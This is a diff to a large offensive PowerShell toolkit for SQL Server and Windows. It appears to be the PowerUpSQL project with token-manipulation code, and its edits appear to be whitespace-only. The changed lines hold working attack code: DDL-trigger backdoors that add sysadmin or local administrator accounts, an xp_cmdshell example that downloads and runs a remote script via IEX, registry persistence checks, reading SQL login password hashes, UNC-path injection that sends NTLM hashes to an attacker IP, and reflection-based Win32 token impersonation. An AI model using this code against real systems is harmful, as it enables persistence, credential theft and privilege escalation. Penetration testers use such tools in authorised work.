-			    principal_id as [PrincipalId],
-			    type_desc as [PrincipalType],
+                principal_id as [PrincipalId],
+                type_desc as [PrincipalType],
                 sid as [PrincipalSid],
                 create_date as [CreateDate],
-			    default_database_name as [DefaultDatabaseName],
-			    [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
+                default_database_name as [DefaultDatabaseName],
+                [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
                 FROM [sys].[sql_logins]"
         }
 
@@ -18210,10 +18214,10 @@ Function   Get-SQLPersistRegRun
         -- Get AutoLogin Default Domain
         DECLARE @CheckValue  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'Software\Microsoft\Windows\CurrentVersion\Run',
-        @value_name		= N'$Name',
-        @value			= @CheckValue output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'Software\Microsoft\Windows\CurrentVersion\Run',
+        @value_name     = N'$Name',
+        @value          = @CheckValue output
         
         -- Display Results
         SELECT CheckValue = @CheckValue"
@@ -18396,10 +18400,10 @@ Function   Get-SQLPersistRegDebugger
         -- Get AutoLogin Default Domain
         DECLARE @CheckValue  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
-        @value_name		= N'Debugger',
-        @value			= @CheckValue output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
+        @value_name     = N'Debugger',
+        @value          = @CheckValue output
         
         -- Display Results
         SELECT CheckValue = @CheckValue"
@@ -18429,64 +18433,64 @@ Function   Get-SQLPersistRegDebugger
 Function Get-SQLPersistTriggerDDL
 {
     <#
-	.SYNOPSIS
-	This script can be used backdoor a Windows system using a SQL Server DDL event triggers.
+    .SYNOPSIS
+    This script can be used backdoor a Windows system using a SQL Server DDL event triggers.
 
-	.DESCRIPTION
-	This script can be used backdoor a Windows system using a SQL Server DDL event triggers.
-	As a result, the associated TSQL will execute when any DDL_SERVER_LEVEL_EVENTS occur.  This script supports the executing operating system 
-	and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
-	The script also support add a new sysadmin. This script can be run as the current Windows user or a 
-	SQL Server login can be provided. Note: This script requires sysadmin privileges.  The DDL_SERVER_LEVEL_EVENTS include:
+    .DESCRIPTION
+    This script can be used backdoor a Windows system using a SQL Server DDL event triggers.
+    As a result, the associated TSQL will execute when any DDL_SERVER_LEVEL_EVENTS occur.  This script supports the executing operating system 
+    and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
+    The script also support add a new sysadmin. This script can be run as the current Windows user or a 
+    SQL Server login can be provided. Note: This script requires sysadmin privileges.  The DDL_SERVER_LEVEL_EVENTS include:
 
-	CREATE DATABASE
-	ALTER DATABASE
-	DROP DATABASE
-	CREATE_ENDPOINT
-	ALTER_ENDPOINT
-	DROP_ENDPOINT
-	ADD_ROLE_MEMBER
-	DROP_ROLE_MEMBER
-	ADD_SERVER_ROLE_MEMBER
-	DROP_SERVER_ROLE_MEMBER
-	ALTER_AUTHORIZATION_SERVER
-	DENY_SERVER
-	GRANT_SERVER
-	REVOKE_SERVER
-	ALTER_LOGIN
-	CREATE_LOGIN
-	DROP_LOGIN
-	
-	Feel free to change "DDL_SERVER_LEVEL_EVENTS" to "DDL_EVENTS" if you want more coverage, but I haven't had time to test it.
+    CREATE DATABASE
+    ALTER DATABASE
+    DROP DATABASE
+    CREATE_ENDPOINT
+    ALTER_ENDPOINT
+    DROP_ENDPOINT
+    ADD_ROLE_MEMBER
+    DROP_ROLE_MEMBER
+    ADD_SERVER_ROLE_MEMBER
+    DROP_SERVER_ROLE_MEMBER
+    ALTER_AUTHORIZATION_SERVER
+    DENY_SERVER
+    GRANT_SERVER
+    REVOKE_SERVER
+    ALTER_LOGIN
+    CREATE_LOGIN
+    DROP_LOGIN
+    
+    Feel free to change "DDL_SERVER_LEVEL_EVENTS" to "DDL_EVENTS" if you want more coverage, but I haven't had time to test it.
 
-	.EXAMPLE
-	Create a DDL trigger to add a new sysadmin.  The example shows the script being run using a SQL Login.
+    .EXAMPLE
+    Create a DDL trigger to add a new sysadmin.  The example shows the script being run using a SQL Login.
 
-	PS C:\> Get-SQLPersistTriggerDDL -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
+    PS C:\> Get-SQLPersistTriggerDDL -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
 
-	.EXAMPLE
-	Create a DDL trigger to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
-	being run as the current windows user.
+    .EXAMPLE
+    Create a DDL trigger to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
+    being run as the current windows user.
 
-	PS C:\> Get-SQLPersistTriggerDDL -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
+    PS C:\> Get-SQLPersistTriggerDDL -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
 
-	.EXAMPLE
-	Create a DDL trigger to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
-	from the internet and executes it.  The example shows the script being run as the current Windows user.
+    .EXAMPLE
+    Create a DDL trigger to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
+    from the internet and executes it.  The example shows the script being run as the current Windows user.
 
-	PS C:\> Get-SQLPersistTriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
-	
-	.EXAMPLE
-	Remove evil_DDL_trigger as the current Windows user.
+    PS C:\> Get-SQLPersistTriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
+    
+    .EXAMPLE
+    Remove evil_DDL_trigger as the current Windows user.
 
-	PS C:\> Get-SQLPersistTriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -Remove
+    PS C:\> Get-SQLPersistTriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -Remove
 
-	.LINK
-	http://www.netspi.com
-	https://technet.microsoft.com/en-us/library/ms186582(v=sql.90).aspx
+    .LINK
+    http://www.netspi.com
+    https://technet.microsoft.com/en-us/library/ms186582(v=sql.90).aspx
 
-	.NOTES
-	Author: Scott Sutherland - 2016, NetSPI
+    .NOTES
+    Author: Scott Sutherland - 2016, NetSPI
     #>
 
   [CmdletBinding()]
@@ -18663,12 +18667,12 @@ Function Get-SQLPersistTriggerDDL
                         -- Setup reg path 
                         DECLARE @SQLServerInstance varchar(250)  
                         if @@SERVICENAME = 'MSSQLSERVER'
-                        BEGIN											
+                        BEGIN                                           
                             set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
-                        END						
+                        END                     
                         ELSE
                         BEGIN
-                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
+                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))     
                         END
 
                         -- Grab service account from service's reg path
@@ -20266,7 +20270,7 @@ Function  Invoke-SQLAuditPrivAutoExecSp
             $is_auto_executed = $_.is_auto_executed    
 
             # Get a list of explicit permissions 
-	        $Results = Get-SQLDatabasePriv -Verbose -DatabaseName master -SuppressVerbose -Instance $Instance -Username $username -Password $password -Credential $credential | 
+            $Results = Get-SQLDatabasePriv -Verbose -DatabaseName master -SuppressVerbose -Instance $Instance -Username $username -Password $password -Credential $credential | 
             Where-Object {$_.objectname -like "$ProcedureName"}
 
             # Check if any permisssions exist
@@ -20618,8 +20622,8 @@ Function Invoke-SQLAuditPrivXpDirtree
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                 $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
 
-								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
-								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
+                                # Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
+                                Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                 Start-Sleep -s $TimeOut
                                 
                                 # Stop sniffing and print password hashes
@@ -20959,8 +20963,8 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                 $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
 
-								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
-								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
+                                # Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
+                                Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                 Start-Sleep -s $TimeOut
 
                                 # Stop sniffing and print password hashes
@@ -23278,11 +23282,11 @@ Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon
 
 Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
     This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.
-	
+    
 .PARAMETER CreateProcess
 
 Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.
-	
+    
 .PARAMETER WhoAmI
 
 Switch. Displays the credentials the PowerShell thread is running under.
@@ -23317,7 +23321,7 @@ to "Everyone".
 
 If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.
 
-	
+    
 .EXAMPLE
 
 Invoke-TokenManipulation -Enumerate
@@ -23450,67 +23454,67 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
    
     Set-StrictMode -Version 2
 
-	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
-	Function Get-DelegateType
-	{
-	    Param
-	    (
-	        [OutputType([Type])]
-	        
-	        [Parameter( Position = 0)]
-	        [Type[]]
-	        $Parameters = (New-Object Type[](0)),
-	        
-	        [Parameter( Position = 1 )]
-	        [Type]
-	        $ReturnType = [Void]
-	    )
+    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+    Function Get-DelegateType
+    {
+        Param
+        (
+            [OutputType([Type])]
+            
+            [Parameter( Position = 0)]
+            [Type[]]
+            $Parameters = (New-Object Type[](0)),
+            
+            [Parameter( Position = 1 )]
+            [Type]
+            $ReturnType = [Void]
+        )
 
-	    $Domain = [AppDomain]::CurrentDomain
-	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
-	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
-	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
-	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-	    
-	    Write-Output $TypeBuilder.CreateType()
-	}
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+        Write-Output $TypeBuilder.CreateType()
+    }
 
 
-	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
-	Function Get-ProcAddress
-	{
-	    Param
-	    (
-	        [OutputType([IntPtr])]
-	    
-	        [Parameter( Position = 0, Mandatory = $True )]
-	        [String]
-	        $Module,
-	        
-	        [Parameter( Position = 1, Mandatory = $True )]
-	        [String]
-	        $Procedure
-	    )
+    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+    Function Get-ProcAddress
+    {
+        Param
+        (
+            [OutputType([IntPtr])]
+        
+            [Parameter( Position = 0, Mandatory = $True )]
+            [String]
+            $Module,
+            
+            [Parameter( Position = 1, Mandatory = $True )]
+            [String]
+            $Procedure
+        )
 
-	    # Get a reference to System.dll in the GAC
-	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
-	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
-	    # Get a reference to the GetModuleHandle and GetProcAddress methods
-	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
-	    # Get a handle to the module specified
-	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
-	    $tmpPtr = New-Object IntPtr
-	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+        # Get a reference to System.dll in the GAC
+        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+        # Get a reference to the GetModuleHandle and GetProcAddress methods
+        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+        # Get a handle to the module specified
+        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+        $tmpPtr = New-Object IntPtr
+        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
 
-	    # Return the address of the function
-	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
-	}
+        # Return the address of the function
+        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+    }
 
     ###############################
     #Win32Constants
@@ -23560,17 +23564,17 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     ###############################
     #Win32Structures
     ###############################
-	#Define all the structures/enums that will be used
-	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
-	$Domain = [AppDomain]::CurrentDomain
-	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
-	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
-	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+    #Define all the structures/enums that will be used
+    #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
+    $Domain = [AppDomain]::CurrentDomain
+    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
+    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
 
     #ENUMs
-	$TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
-	$TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
+    $TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
     $TypeBuilder.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
     $TypeBuilder.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
     $TypeBuilder.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
@@ -23611,27 +23615,27 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
     $TypeBuilder.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
     $TypeBuilder.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
-	$TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()
+    $TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()
 
     #STRUCTs
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
-	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
-	$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
-	$LARGE_INTEGER = $TypeBuilder.CreateType()
+    $TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
+    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
+    $LARGE_INTEGER = $TypeBuilder.CreateType()
 
     #Struct LUID
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
-	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
-	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
-	$LUID = $TypeBuilder.CreateType()
+    $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
+    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
+    $LUID = $TypeBuilder.CreateType()
 
     #Struct TOKEN_STATISTICS
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
-	$TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
+    $TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
     $TypeBuilder.DefineField('ExpirationTime', $LARGE_INTEGER, 'Public') | Out-Null
     $TypeBuilder.DefineField('TokenType', [UInt32], 'Public') | Out-Null
     $TypeBuilder.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
@@ -23640,29 +23644,29 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
     $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
     $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
-	$TOKEN_STATISTICS = $TypeBuilder.CreateType()
+    $TOKEN_STATISTICS = $TypeBuilder.CreateType()
 
     #Struct LSA_UNICODE_STRING
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
-	$TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
+    $TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
     $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
-	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()
+    $LSA_UNICODE_STRING = $TypeBuilder.CreateType()
 
     #Struct LSA_LAST_INTER_LOGON_INFO
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
-	$TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
+    $TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
     $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
-	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()
+    $LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()
 
     #Struct SECURITY_LOGON_SESSION_DATA
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
-	$TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
     $TypeBuilder.DefineField('Username', $LSA_UNICODE_STRING, 'Public') | Out-Null
     $TypeBuilder.DefineField('LoginDomain', $LSA_UNICODE_STRING, 'Public') | Out-Null
     $TypeBuilder.DefineField('AuthenticationPackage', $LSA_UNICODE_STRING, 'Public') | Out-Null
@@ -23684,13 +23688,13 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineField('PasswordLastSet', $LARGE_INTEGER, 'Public') | Out-Null
     $TypeBuilder.DefineField('PasswordCanChange', $LARGE_INTEGER, 'Public') | Out-Null
     $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
-	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()
+    $SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()
 
     #Struct STARTUPINFO
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
-	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
     $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
     $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
     $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
@@ -23707,22 +23711,22 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
     $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
     $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
-	$STARTUPINFO = $TypeBuilder.CreateType()
+    $STARTUPINFO = $TypeBuilder.CreateType()
 
     #Struct PROCESS_INFORMATION
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
-	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
+    $TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
+    $TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
     $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
     $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
-	$PROCESS_INFORMATION = $TypeBuilder.CreateType()
+    $PROCESS_INFORMATION = $TypeBuilder.CreateType()
 
     #Struct TOKEN_ELEVATION
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
-	$TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
-	$TOKEN_ELEVATION = $TypeBuilder.CreateType()
+    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
+    $TOKEN_ELEVATION = $TypeBuilder.CreateType()
 
     #Struct LUID_AND_ATTRIBUTES
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
@@ -23730,7 +23734,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
     $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
     $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
-		
+        
     #Struct TOKEN_PRIVILEGES
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
     $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
@@ -23789,68 +23793,68 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     #Win32Functions
     ###############################
     $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
-	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
-	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
 
     $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
-	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
-	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    
+    $OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
+    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    
 
